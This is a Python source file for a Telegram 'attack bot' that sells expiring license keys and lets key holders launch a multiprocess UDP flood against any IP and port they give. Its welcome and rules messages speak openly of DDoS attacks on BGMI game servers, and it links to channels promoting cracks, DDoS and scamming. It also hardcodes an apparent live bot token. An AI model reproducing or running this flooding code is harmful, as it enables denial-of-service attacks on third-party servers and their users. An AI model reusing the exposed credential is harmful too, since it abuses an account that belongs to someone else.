import telebot
import socket
import multiprocessing
import os
import random
import time
import subprocess
import sys
import datetime
import logging
import socket
import requests
import json
import string
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# 🎛️ Function to install required packages
def install_requirements():
    # Check if requirements.txt file exists
    try:
        with open('requirements.txt', 'r') as f:
            pass
    except FileNotFoundError:
        print("Error: requirements.txt file not found!")
        return

    # Install packages from requirements.txt
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
        print("Installing packages from requirements.txt...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install packages from requirements.txt ({e})")

    # Install pyTelegramBotAPI
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyTelegramBotAPI'])
        print("Installing pyTelegramBotAPI...")
    except subprocess.CalledProcessError as e:
        print(f"Error: Failed to install pyTelegramBotAPI ({e})")

# Call the function to install requirements
install_requirements()

# 🎛️ Telegram API token (replace with your actual token)
TOKEN = '7615096107:AAEHQy1Z8Ivei_s5nLxoPh6xlSv0PlQ2amA'
bot = telebot.TeleBot(TOKEN, threaded=False)

# 🛡️ List of authorized user IDs (replace with actual IDs)
admin_id = ['6906270448']

# 🌐 Global dictionary to keep track of user attacks
user_attacks = {}

# Define paths to store user and key data
USER_FILE = "users.json"
KEY_FILE = "keys.json"

# Load the users and keys data
def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def load_keys():
    try:
        with open(KEY_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as f:
        json.dump(users, f, indent=4)

def save_keys():
    with open(KEY_FILE, "w") as f:
        json.dump(keys, f, indent=4)

# Initialize users and keys
users = load_users()
keys = load_keys()

# Function to generate a random key
def generate_key(length=11):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Function to add time to current date
def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

# 💬 Command handler for /genkey
@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            try:
                time_amount = int(command[1])
                time_unit = command[2].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"License: {key}\nExpires On: {expiration_date}\nAvailable For 1 Telegram Account."
            except ValueError:
                response = "Please specify a valid number and unit of time (hours/days)."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "Only the admin can generate keys."

    bot.reply_to(message, response, reply_markup=get_inline_keyboard())

# 💬 Command handler for /redeem
@bot.message_handler(commands=['redeem'])
def redeem_key_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        key = command[1]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅ Key redeemed successfully! Access granted until: {users[user_id]}"
        else:
            response = "Expired key or invalid key."
    else:
        response = "Usage: /redeem <key>"

    bot.reply_to(message, response, reply_markup=get_inline_keyboard())


# ⏳ Variable to track bot start time for uptime
bot_start_time = datetime.datetime.now()

# 📜 Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 🛠️ Function to send UDP packets
def udp_flood(target_ip, target_port, stop_flag):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
    while not stop_flag.is_set():
        try:
            packet_size = random.randint(64, 1469)  # Random packet size
            data = os.urandom(packet_size)  # Generate random data
            for _ in range(20000):  # Maximize impact by sending multiple packets
                sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            logging.error(f"Error sending packets: {e}")
            break  # Exit loop on any socket error

def start_udp_flood(user_id, target_ip, target_port):
    stop_flag = multiprocessing.Event()
    processes = []

    # Allow up to 1000 CPU threads for maximum performance
    for _ in range(min(2000, multiprocessing.cpu_count())):
        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
        process.start()
        processes.append(process)

    # Store processes and stop flag for the user
    user_attacks[user_id] = (processes, stop_flag)
    
    # Send message with the attack info and inline keyboard
    bot.send_message(user_id, 
                     f"☢️ Launching an attack on {target_ip}:{target_port} 💀", 
                     reply_markup=get_inline_keyboard())


def stop_attack(user_id):
    if user_id in user_attacks:
        processes, stop_flag = user_attacks[user_id]
        stop_flag.set()  # 🛑 Stop the attack

        # 🕒 Wait for all processes to finish
        for process in processes:
            process.join()

        del user_attacks[user_id]
        
        # Send message that the attack has stopped with inline keyboard
        bot.send_message(user_id, 
                         "🔴 All Attack stopped.", 
                         reply_markup=get_inline_keyboard())
    else:
        bot.send_message(user_id, 
                         "❌ No active attack found >ᴗ<", 
                         reply_markup=get_inline_keyboard())


# 🕰️ Function to calculate bot uptime ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷ˏˋ°•*⁀➷
def get_uptime():
    uptime = datetime.datetime.now() - bot_start_time
    return str(uptime).split('.')[0]  # Format uptime to exclude microseconds ˏˋ°•*⁀➷ˏˋ°•*⁀➷

# 📜 Function to log commands and actions
def log_command(user_id, command):
    logging.info(f"User ID {user_id} executed command: {command}")

def get_inline_keyboard():
    keyboard = InlineKeyboardMarkup()
    button1 = InlineKeyboardButton("👤 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥 👤", url="https://t.me/RARExxOWNER")
    button2 = InlineKeyboardButton("🔥 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 🔥", url="https://t.me/RARECRACKS")
    button3 = InlineKeyboardButton("🔗 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗚𝗥𝗢𝗨𝗣 🔗", url="https://t.me/freerareddos")
    button4 = InlineKeyboardButton("💀 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗦𝗖𝗔𝗠𝗠𝗘𝗥𝗦 𝗛𝗘𝗟𝗟 💀", url="https://t.me/RARESCAMMERSHELL")
    
    # Add buttons as separate rows
    keyboard.add(button1)
    keyboard.add(button2)
    keyboard.add(button3)
    keyboard.add(button4)
    
    return keyboard

# 💬 Command handler for /start ☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆
# 💬 Command handler for /start ☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆☄. *. ⋆
# 💬 Command handler for /start
@bot.message_handler(commands=['start'])
def start(message):
    user_id = str(message.from_user.id)  # Convert user_id to string for matching with the users dictionary
    log_command(user_id, '/start')  # Log the /start command
    
    # Debugging: Print the user's ID and the available users
    print(f"User ID: {user_id}")
    print(f"Users Dictionary: {users}")
    
    # Check if the user has a valid key by verifying the user_id in the users dictionary
    if user_id not in users:
        response = "🚫 *Access Denied!* Contact the owner for assistance: @RARExxOWNER"
        print(f"User {user_id} not found in users dictionary.")
        bot.reply_to(message, response)
        return
    
    # Retrieve and parse the expiration date from the users dictionary
    try:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        print(f"Expiration Date: {expiration_date}")
    except ValueError:
        bot.reply_to(message, "❌ Invalid expiration date format.", reply_markup=get_inline_keyboard())
        return

    # Check if the key has expired
    if expiration_date > datetime.datetime.now():
        # Create a detailed welcome message with rules and commands
        welcome_message = (
            "🎮 *Welcome to the Ultimate Attack Bot!* 🚀\n\n"
            "Get ready to dive into the action! 💥\n\n"
            "✨ *How to Get Started:*\n"
            "- Use `/attack <IP>:<port>` to start an attack. 💣\n"
            "- Use `/stop` to halt your attack at any time. 🛑\n"
            "- Use `/start` to fuck off the BGMI server! 🔥\n\n"
            "---\n\n"
            "📜 *Bot Rules - Keep It Cool!* 🌟\n\n"
            "1. ⛔ *No Spamming!* \n   Rest for 5-6 matches between DDOS attacks to keep things fair.\n\n"
            "2. 🔫 *Limit Your Kills!* \n   Aim for 30-40 kills max to keep the gameplay fun.\n\n"
            "3. 🎮 *Play Smart!* \n   Stay low-key and avoid being reported. Keep it clean!\n\n"
            "4. 🚫 *No Mods Allowed!* \n   Using hacked files will result in an instant ban.\n\n"
            "5. 🤝 *Be Respectful!* \n   Treat others kindly. Let's keep communication fun and friendly.\n\n"
            "6. 🛡️ *Report Issues!* \n   If you encounter any problems, message the owner for support.\n\n"
            "7. ✅ *Double-Check Your Commands!* \n   Always make sure you're executing the right command before hitting enter.\n\n"
            "8. ❌ *No Unauthorized Attacks!* \n   Always get permission before launching an attack.\n\n"
            "9. ⚖️ *Understand the Consequences!* \n   Be aware of the impact of your actions.\n\n"
            "10. 🤗 *Play Fair and Have Fun!* \n   Stick to the rules, stay within limits, and enjoy the game! 🎉\n\n"
            "---\n\n"
            "💡 *Follow the Rules & Let's Game Together!* 🎮\n"
            "Let's create an amazing experience for everyone! 🌟\n\n"
            "📞 *Contact the Owner:* \n"
            "Instagram & Telegram: [RARExxOWNER](https://t.me/RARExxOWNER)\n\n"
            "---\n\n"
            "⚡ *Bot Commands:* \n"
            "- Type `/help` for a full list of commands. 📋\n"
            "- Type `/id` to find your user ID. 🆔"
        )
        bot.reply_to(message, welcome_message, parse_mode='Markdown', reply_markup=get_inline_keyboard())
    else:
        bot.reply_to(message, "🚫 *Access Denied!* Your key has expired. Please redeem a new key.")



        
# 💬 Command handler for /attack ⋆.˚🦋༘⋆⋆.˚🦋༘⋆⋆.˚🦋༘⋆
# 💬 Command handler for /attack
@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = str(message.from_user.id)  # Convert user_id to string for matching with the users dictionary
    log_command(user_id, '/attack')  # Log the command

    # Debugging: Print the user's ID and the available users
    print(f"User ID: {user_id}")
    print(f"Users Dictionary: {users}")
    
    # Check if the user has a valid key by verifying the user_id in the users dictionary
    if user_id not in users:
        response = "🚫 Access Denied! Contact the owner for assistance: @RARExxOWNER"
        print(f"User {user_id} not found in users dictionary.")
        bot.reply_to(message, response, reply_markup=get_inline_keyboard())
        return
    
    # Retrieve and parse the expiration date from the users dictionary
    try:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        print(f"Expiration Date: {expiration_date}")
    except ValueError:
        bot.reply_to(message, "❌ Invalid expiration date format.", reply_markup=get_inline_keyboard())
        return

    # Check if the key has expired
    if expiration_date > datetime.datetime.now():
        # Parse target IP and port from the command (e.g., /attack <IP>:<port>)
        try:
            command = message.text.split()
            target = command[1].split(':')
            target_ip = target[0]
            target_port = int(target[1])

            # Start the UDP flood attack (you need to define start_udp_flood elsewhere in your code)
            start_udp_flood(user_id, target_ip, target_port)
        except (IndexError, ValueError):
            # If command format is wrong, send error message with inline keyboard
            bot.send_message(message.chat.id, "❌ Invalid format! Use /attack `<IP>:<port>`.", 
                             reply_markup=get_inline_keyboard())
    else:
        bot.reply_to(message.chat.id, "🚫 *Access Denied!* Your key has expired. Please redeem a new key.")

# Command handler for /stop
@bot.message_handler(commands=['stop'])
def stop(message):
    user_id = str(message.from_user.id)  # Convert user_id to string for matching with the users dictionary
    log_command(user_id, '/stop')  # Log the /stop command

    # Debugging: Print the user's ID and the available users
    print(f"User ID: {user_id}")
    print(f"Users Dictionary: {users}")
    
    # Check if the user has a valid key by verifying the user_id in the users dictionary
    if user_id not in users:
        response = "🚫 Access Denied! Contact the owner for assistance: @RARExxOWNER"
        print(f"User {user_id} not found in users dictionary.")
        bot.reply_to(message, response, reply_markup=get_inline_keyboard())
        return
    
    # Retrieve and parse the expiration date from the users dictionary
    try:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        print(f"Expiration Date: {expiration_date}")
    except ValueError:
        bot.reply_to(message, "❌ Invalid expiration date format.", reply_markup=get_inline_keyboard())
        return

    # Check if the key has expired
    if expiration_date > datetime.datetime.now():
        # Stop the ongoing attack for authorized users
        stop_attack(user_id)

        # Send confirmation message about stopping the attack with inline keyboard options
        bot.send_message(message.chat.id, "🛑 Attack has been stopped successfully.", reply_markup=get_inline_keyboard())
    else:
        bot.reply_to(message.chat.id, "🚫 *Access Denied!* Your key has expired. Please redeem a new key.")


# 💬 Command handler for /id  
@bot.message_handler(commands=['id'])  # 👀 Handling the /id command ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
def show_id(message):
    user_id = message.from_user.id  # 🔍 Getting the user ID ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
    username = message.from_user.username  # 👥 Getting the user's username ⋇⊶⊰❣⊱⊷⋇ ⋇⊶⊰❣⊱⊷⋇
    log_command(user_id, '/id')  # 👀 Logging the command ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆ ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆

    # 👤 Sending the message with the user ID and username, and adding an inline keyboard
    id_message = f"👤 Your User ID is: `{user_id}`\n" \
                 f"👥 Your Username is: @{username}"

    bot.reply_to(message, id_message, reply_markup=get_inline_keyboard())  # Sending the message with inline keyboard


# 👑 Printing the bot owner's username ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
@bot.message_handler(commands=['owner'])
def bot_owner_message(message):
    bot_owner = "RARExxOWNER"  # 👑 The bot owner's username  ⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆⋆｡ﾟ☁︎｡⋆｡ ﾟ☾ ﾟ｡⋆
    response = f"🤖 This bot is owned by: @{bot_owner}"
    bot.reply_to(message, response, reply_markup=get_inline_keyboard())

@bot.message_handler(commands=['rules'])
def rules(message):
    log_command(message.from_user.id, '/rules')
    
    rules_message = (
        "🌟 *Bot Rules - Keep It Cool!* 🌟\n\n"
        
        "📝 *1. No Spamming Attacks!* ⛔\n"
        "   - Rest for 5-6 matches between DDOS.\n\n"
        
        "🔫 *2. Limit Your Kills!* 🚫\n"
        "   - Stay under 30-40 kills to keep the game fair.\n\n"
        
        "🎮 *3. Play Smart!* 🧠\n"
        "   - Avoid reports and stay under the radar.\n\n"
        
        "🚫 *4. No Mods Allowed!* ⚠️\n"
        "   - Using hacked files or mods will result in a ban.\n\n"
        
        "🤝 *5. Be Respectful!* 💬\n"
        "   - Keep communication friendly and positive.\n\n"
        
        "🛡️ *6. Report Issues!* 📩\n"
        "   - If you encounter any problems, message the owner.\n\n"
        
        "✅ *7. Check Your Command Before Executing!* 🧐\n"
        "   - Double-check your inputs before pressing send.\n\n"
        
        "⚠️ *8. No Attacks Without Permission!* 🔴\n"
        "   - Always ask before attacking, respect others' gameplay.\n\n"
        
        "⚖️ *9. Be Aware of the Consequences!* 🚨\n"
        "   - Your actions have consequences, think before you act.\n\n"
        
        "🎉 *10. Play Fair and Have Fun!* 😄\n"
        "   - Stay within limits and enjoy the game with others!\n\n"
        
        "⚠️ *Note:* Always follow the rules to ensure a smooth experience for everyone. Let's make it fun! 🎮"
    )
    
    bot.reply_to(message, rules_message, parse_mode='Markdown', reply_markup=get_inline_keyboard())

# 💬 Command handler for /owner. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁.
@bot.message_handler(commands=['owner'])
def owner(message):
    log_command(message.from_user.id, '/owner')
    response = "📞 Contact the owner: @RARExxOWNER"
    bot.reply_to(message, response, reply_markup=get_inline_keyboard())

# 💬 Command handler for /uptime. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁.
@bot.message_handler(commands=['uptime'])
def uptime(message):
    log_command(message.from_user.id, '/uptime')
    uptime_message = f"⏱️ Bot Uptime: {get_uptime()}"
    bot.reply_to(message, uptime_message, reply_markup=get_inline_keyboard())

# 💬 Command handler for /ping. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
@bot.message_handler(commands=['ping'])
@bot.message_handler(commands=['ping'])
def ping_command(message):
    user_id = message.from_user.id
    log_command(user_id, '/ping')

    bot.send_message(message.chat.id, "Checking your connection speed...")

    # Measure ping time     . ݁₊ ⊹ . ݁˖ . ݁        . ݁₊ ⊹ . ݁˖ . ݁         . ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
    start_time = time.time()
    try:
        # Use a simple DNS resolution to check responsiveness     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦. ݁₊ ⊹ . ݁˖ . ݁
        socket.gethostbyname('google.com')
        ping_time = (time.time() - start_time) * 1000  # Convert to milliseconds     ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
        ping_response = (
            f"Ping: `{ping_time:.2f} ms` ⏱️\n"
            f"Your IP: `{get_user_ip(user_id)}` 📍\n"
            f"Your Username: `{message.from_user.username}` 👤\n"
        )
        bot.reply_to(message, ping_response, reply_markup=get_inline_keyboard())  # Reply with inline keyboard
    except socket.gaierror:
        bot.send_message(message.chat.id, "❌ Failed to ping! Check your connection.")
        
def get_user_ip(user_id):
    try:
        ip_address = requests.get('https://api.ipify.org/').text
        return ip_address
    except:
        return "IP Not Found 🤔"

# 💬 Command handler for /help           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦           ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
@bot.message_handler(commands=['help'])
def help_command(message):
    log_command(message.from_user.id, '/help')
    
    help_message = (
        "🤔 *Need Help?* 🤔\n\n"
        
        "🔹 *`/start`* - Start the bot 🔋\n"
        "   - Initialize the bot and get started.\n\n"
        
        "💣 *`/attack <IP>:<port>`* - Launch a powerful attack 💥\n"
        "   - Use this command to initiate a targeted attack.\n\n"
        
        "🛑 *`/stop`* - Stop the attack 🛑\n"
        "   - Halt any ongoing attacks immediately.\n\n"
        
        "👀 *`/id`* - Show your user ID 👤\n"
        "   - Display your unique user identifier.\n\n"
        
        "📚 *`/rules`* - View the bot rules 📖\n"
        "   - Check the bot's rules to ensure fair play.\n\n"
        
        "👑 *`/owner`* - Contact the owner 👑\n"
        "   - Reach out to the bot's owner for any inquiries.\n\n"
        
        "⏰ *`/uptime`* - Get bot uptime ⏱️\n"
        "   - See how long the bot has been running.\n\n"
        
        "📊 *`/ping`* - Check your connection ping 📈\n"
        "   - Test your connection to the bot server.\n\n"
        
        "🤝 *`/help`* - Show this help message 🤝\n"
        "   - Display the list of available commands.\n\n"
        
        "✨ *Tip:* Use these commands to fully interact with the bot and make the most of your experience! 🎮"
    )
    
    bot.reply_to(message, help_message, parse_mode='Markdown', reply_markup=get_inline_keyboard())

# 🎮 Run the bot ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
if __name__ == "__main__":
    print(" 🎉🔥 Starting the Telegram bot...")  # Print statement for bot starting
    print(" ⏱️ Initializing bot components...")  # Print statement for initialization

    # Add a delay to allow the bot to initialize ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
    time.sleep(5)

    # Print a success message if the bot starts successfully ╰┈➤. ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
    print(" 🚀 Telegram bot started successfully!")  # ╰┈➤. Print statement for successful startup
    print(" 👍 Bot is now online and ready to Ddos_attack! ▰▱▰▱▰▱▰▱▰▱▰▱▰▱")

    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot encountered an error: {e}")
        print(" 🚨 Error: Bot encountered an error. Restarting in 5 seconds... ⏰")
        time.sleep(5)  # Wait before restarting ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
        print(" 🔁 Restarting the Telegram bot... 🔄")
        print(" 💻 Bot is now restarting. Please wait... ⏳")
        
